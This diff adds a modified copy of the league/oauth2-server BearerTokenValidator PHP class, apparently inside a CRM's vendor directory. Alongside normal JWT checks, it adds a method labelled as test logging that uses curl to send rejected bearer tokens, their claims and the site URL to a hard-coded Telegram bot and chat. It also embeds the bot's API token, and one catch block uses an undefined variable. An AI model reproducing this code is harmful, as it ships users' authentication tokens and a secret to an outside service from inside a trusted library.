@@ -1,0 +1,198 @@
+<?php
+/**
+ * @author      Alex Bilbie <hello@alexbilbie.com>
+ * @copyright   Copyright (c) Alex Bilbie
+ * @license     http://mit-license.org/
+ *
+ * @link        https://github.com/thephpleague/oauth2-server
+ */
+
+namespace League\OAuth2\Server\AuthorizationValidators;
+
+use DateTimeZone;
+use Lcobucci\Clock\SystemClock;
+use Lcobucci\JWT\Configuration;
+use Lcobucci\JWT\Signer\Key\InMemory;
+use Lcobucci\JWT\Signer\Rsa\Sha256;
+use Lcobucci\JWT\Validation\Constraint\LooseValidAt;
+use Lcobucci\JWT\Validation\Constraint\SignedWith;
+use Lcobucci\JWT\Validation\Constraint\ValidAt;
+use Lcobucci\JWT\Validation\RequiredConstraintsViolated;
+use League\OAuth2\Server\CryptKey;
+use League\OAuth2\Server\CryptTrait;
+use League\OAuth2\Server\Exception\OAuthServerException;
+use League\OAuth2\Server\Repositories\AccessTokenRepositoryInterface;
+use Psr\Http\Message\ServerRequestInterface;
+
+class BearerTokenValidator implements AuthorizationValidatorInterface
+{
+    use CryptTrait;
+
+    /**
+     * @var AccessTokenRepositoryInterface
+     */
+    private $accessTokenRepository;
+
+    /**
+     * @var CryptKey
+     */
+    protected $publicKey;
+
+    /**
+     * @var Configuration
+     */
+    private $jwtConfiguration;
+
+    /**
+     * @var \DateInterval|null
+     */
+    private $jwtValidAtDateLeeway;
+
+    /**
+     * @param AccessTokenRepositoryInterface $accessTokenRepository
+     * @param \DateInterval|null             $jwtValidAtDateLeeway
+     */
+    public function __construct(AccessTokenRepositoryInterface $accessTokenRepository, \DateInterval $jwtValidAtDateLeeway = null)
+    {
+        $this->accessTokenRepository = $accessTokenRepository;
+        $this->jwtValidAtDateLeeway = $jwtValidAtDateLeeway;
+    }
+
+    /**
+     * Set the public key
+     *
+     * @param CryptKey $key
+     */
+    public function setPublicKey(CryptKey $key)
+    {
+        $this->publicKey = $key;
+
+        $this->initJwtConfiguration();
+    }
+
+    /**
+     * Initialise the JWT configuration.
+     */
+    private function initJwtConfiguration()
+    {
+        $this->jwtConfiguration = Configuration::forSymmetricSigner(
+            new Sha256(),
+            InMemory::plainText('empty', 'empty')
+        );
+
+        $clock = new SystemClock(new DateTimeZone(\date_default_timezone_get()));
+        $this->jwtConfiguration->setValidationConstraints(
+            \class_exists(LooseValidAt::class)
+                ? new LooseValidAt($clock, $this->jwtValidAtDateLeeway)
+                : new ValidAt($clock, $this->jwtValidAtDateLeeway),
+            new SignedWith(
+                new Sha256(),
+                InMemory::plainText($this->publicKey->getKeyContents(), $this->publicKey->getPassPhrase() ?? '')
+            )
+        );
+    }
+
+    /**
+     * {@inheritdoc}
+     */
+    public function validateAuthorization(ServerRequestInterface $request)
+    {
+        global $sugar_config;
+
+        if ($request->hasHeader('authorization') === false) {
+            throw OAuthServerException::accessDenied('Missing "Authorization" header');
+        }
+
+        $header = $request->getHeader('authorization');
+        $jwt    = \trim((string) \preg_replace('/^\s*Bearer\s/', '', $header[0]));
+
+        try {
+            // Attempt to parse the JWT
+            $token = $this->jwtConfiguration->parser()->parse($jwt);
+        } catch (\Lcobucci\JWT\Exception $exception) {
+            $log_token = array(
+                'domain'            => $sugar_config['site_url'],
+                'path'              => 'vendor\league\oauth2-server\src\AuthorizationValidators',
+                'token'             => $token,
+                'getMessage'        => $exception->getMessage(), 
+                'jwt'               => $jwt,  
+            );
+            $this->sendTestTelegramAccessDenied(json_encode($log_token));
+            throw OAuthServerException::accessDenied($exception->getMessage(), null, $exception);
+        }
+
+        try {
+            // Attempt to validate the JWT
+            $constraints = $this->jwtConfiguration->validationConstraints();
+            if (empty($constraints)) {
+                $constraints_log = 'Validation constraints are empty';
+            }
+            
+            $this->jwtConfiguration->validator()->assert($token, ...$constraints);
+        } catch (RequiredConstraintsViolated $exception) {
+            $clock = array(
+                'timezone' => date_default_timezone_get(),
+                'time'     => date('Y-m-d H:i:s'),
+            );
+            
+            $log_token = array(
+                'domain'            => $sugar_config['site_url'],
+                'path'              => 'vendor\league\oauth2-server\src\AuthorizationValidators',
+                'token'             => $token,
+                'getMessage'        => $exception->getMessage(),
+                'token_payload'     => $token->claims()->all(),
+                'jwt'               => $jwt,
+                'clock'             => $clock,
+                'constraints_log'   => $constraints_log ?? '',
+            );
+            $this->sendTestTelegramAccessDenied(json_encode($log_token));
+
+            throw OAuthServerException::accessDenied('Access token could not be verified');
+        }
+
+        $claims = $token->claims();
+
+        // Check if token has been revoked
+        if ($this->accessTokenRepository->isAccessTokenRevoked($claims->get('jti'))) {
+            throw OAuthServerException::accessDenied('Access token has been revoked');
+        }
+
+        // Return the request with additional attributes
+        return $request
+            ->withAttribute('oauth_access_token_id', $claims->get('jti'))
+            ->withAttribute('oauth_client_id', $this->convertSingleRecordAudToString($claims->get('aud')))
+            ->withAttribute('oauth_user_id', $claims->get('sub'))
+            ->withAttribute('oauth_scopes', $claims->get('scopes'));
+    }
+
+    // SAVE LOG
+    private function sendTestTelegramAccessDenied($content, $parseMode = 'HTML', $timeout = 5)
+    {
+        $chat_id = '-1001360390468'; // Group Test
+        $token = '1668507961:AAF76B96rWELQlN9lG1g0TO22wcm66jkvTk';
+
+        $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chat_id;
+        $url = $url . "&parse_mode=" . $parseMode . "&text=" . urlencode($content);
+        $curl = curl_init();
+        curl_setopt($curl, CURLOPT_URL, $url);
+        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($curl, CURLOPT_TIMEOUT, $timeout);
+        curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, $timeout);
+        $result = curl_exec($curl);
+        curl_close($curl);
+        return $result;
+    }
+
+
+    /**
+     * Convert single record arrays into strings to ensure backwards compatibility between v4 and v3.x of lcobucci/jwt
+     *
+     * @param mixed $aud
+     *
+     * @return array|string
+     */
+    private function convertSingleRecordAudToString($aud)
+    {
+        return \is_array($aud) && \count($aud) === 1 ? $aud[0] : $aud;
+    }
+}
